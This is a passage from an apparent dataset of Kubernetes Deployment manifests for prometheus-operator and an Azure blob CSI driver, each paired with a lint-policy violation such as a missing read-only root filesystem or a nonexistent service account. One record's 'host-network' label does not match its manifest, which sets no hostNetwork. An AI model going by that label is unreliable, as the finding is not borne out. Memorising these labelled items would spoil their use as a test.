    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: controller\n    app.kubernetes.io/name: prometheus-operator\n    app.kubernetes.io/part-of: openshift-monitoring\n    app.kubernetes.io/version: 0.47.0\n  name: prometheus-operator\n  namespace: openshift-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: controller\n      app.kubernetes.io/name: prometheus-operator\n      app.kubernetes.io/part-of: openshift-monitoring\n  template:\n    metadata:\n      annotations:\n        target.workload.openshift.io/management: '{\"effect\": \"PreferredDuringScheduling\"}'\n      labels:\n        app.kubernetes.io/component: controller\n        app.kubernetes.io/name: prometheus-operator\n        app.kubernetes.io/part-of: openshift-monitoring\n        app.kubernetes.io/version: 0.47.0\n    spec:\n      containers:\n      - args:\n        - --kubelet-service=kube-system/kubelet\n        - --prometheus-config-reloader=quay.io/prometheus-operator/prometheus-config-reloader:v0.47.0\n        - --namespaces=openshift-monitoring\n        - --prometheus-instance-namespaces=openshift-monitoring\n        - --thanos-ruler-instance-namespaces=openshift-monitoring\n        - --alertmanager-instance-namespaces=openshift-monitoring\n        - --config-reloader-cpu-limit=0\n        - --config-reloader-memory-limit=0\n        - --web.enable-tls=true\n        - --web.tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --web.tls-min-version=VersionTLS12\n        image: quay.io/prometheus-operator/prometheus-operator:v0.47.0\n        name: prometheus-operator\n        ports:\n        - containerPort: 8080\n          name: http\n        resources:\n          requests:\n            cpu: 5m\n            memory: 60Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: prometheus-operator-tls\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=https://prometheus-operator.openshift-monitoring.svc:8080/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --upstream-ca-file=/etc/configmaps/operator-cert-ca-bundle/service-ca.crt\n        image: quay.io/brancz/kube-rbac-proxy:v0.8.0\n        name: kube-rbac-proxy\n        ports:\n        - containerPort: 8443\n          name: https\n        resources:\n          requests:\n            cpu: 1m\n            memory: 40Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: prometheus-operator-tls\n          readOnly: false\n        - mountPath: /etc/configmaps/operator-cert-ca-bundle\n          name: operator-certs-ca-bundle\n          readOnly: false\n      securityContext: {}\n      serviceAccountName: prometheus-operator\n      volumes:\n      - name: prometheus-operator-tls\n        secret:\n          secretName: prometheus-operator-tls\n      - configMap:\n          name: operator-certs-ca-bundle\n        name: operator-certs-ca-bundle\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"prometheus-operator\" has memory limit 0"
  },
  {
    "id": "9469",
    "manifest_path": "data/manifests/the_stack_sample/sample_3608.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v2.2.2\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --timeout=120s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            cpu: 1\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 1\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: mcr.microsoft.com/k8s/csi/blob-csi:v1.7.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        - --user-agent-suffix=OSS-kubectl\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            cpu: 1\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.3.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 1\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "9470",
    "manifest_path": "data/manifests/the_stack_sample/sample_3608.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v2.2.2\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --timeout=120s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            cpu: 1\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 1\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: mcr.microsoft.com/k8s/csi/blob-csi:v1.7.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        - --user-agent-suffix=OSS-kubectl\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            cpu: 1\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.3.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 1\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "9471",
    "manifest_path": "data/manifests/the_stack_sample/sample_3608.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v2.2.2\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --timeout=120s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            cpu: 1\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 1\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: mcr.microsoft.com/k8s/csi/blob-csi:v1.7.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        - --user-agent-suffix=OSS-kubectl\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            cpu: 1\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.3.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 1\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"blob\" does not have a read-only root file system"
  },
  {
    "id": "9472",
    "manifest_path": "data/manifests/the_stack_sample/sample_3608.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v2.2.2\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --timeout=120s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            cpu: 1\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 1\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: mcr.microsoft.com/k8s/csi/blob-csi:v1.7.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        - --user-agent-suffix=OSS-kubectl\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            cpu: 1\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.3.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 1\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-provisioner\" does not have a read-only root file system"
  },
  {
    "id": "9473",
    "manifest_path": "data/manifests/the_stack_sample/sample_3608.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v2.2.2\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --timeout=120s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            cpu: 1\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 1\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: mcr.microsoft.com/k8s/csi/blob-csi:v1.7.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        - --user-agent-suffix=OSS-kubectl\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            cpu: 1\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.3.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 1\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-resizer\" does not have a read-only root file system"
  },
  {
    "id": "9474",
    "manifest_path": "data/manifests/the_stack_sample/sample_3608.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v2.2.2\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --timeout=120s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            cpu: 1\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 1\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: mcr.microsoft.com/k8s/csi/blob-csi:v1.7.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        - --user-agent-suffix=OSS-kubectl\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            cpu: 1\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.3.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 1\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"liveness-probe\" does not have a read-only root file system"
  },
  {
    "id": "9475",
    "manifest_path": "data/manifests/the_stack_sample/sample_3608.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v2.2.2\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --timeout=120s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            cpu: 1\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 1\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: mcr.microsoft.com/k8s/csi/blob-csi:v1.7.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        - --user-agent-suffix=OSS-kubectl\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            cpu: 1\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.3.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 1\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"csi-blob-controller-sa\" not found"
  },
  {
    "id": "9476",
    "manifest_path": "data/manifests/the_stack_sample/sample_3608.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v2.2.2\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --timeout=120s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            cpu: 1\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 1\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: mcr.microsoft.com/k8s/csi/blob-csi:v1.7.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        - --user-agent-suffix=OSS-kubectl\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            cpu: 1\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.3.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 1\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"blob\" is not set to runAsNonRoot"
  },
  {
    "id": "9477",
    "manifest_path": "data/manifests/the_stack_sample/sample_3608.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v2.2.2\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --timeout=120s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            cpu: 1\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            cpu: 1\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: mcr.microsoft.com/k8s/csi/blob-csi:v1.7.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        - --user-agent-suffix=OSS-kubectl\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: 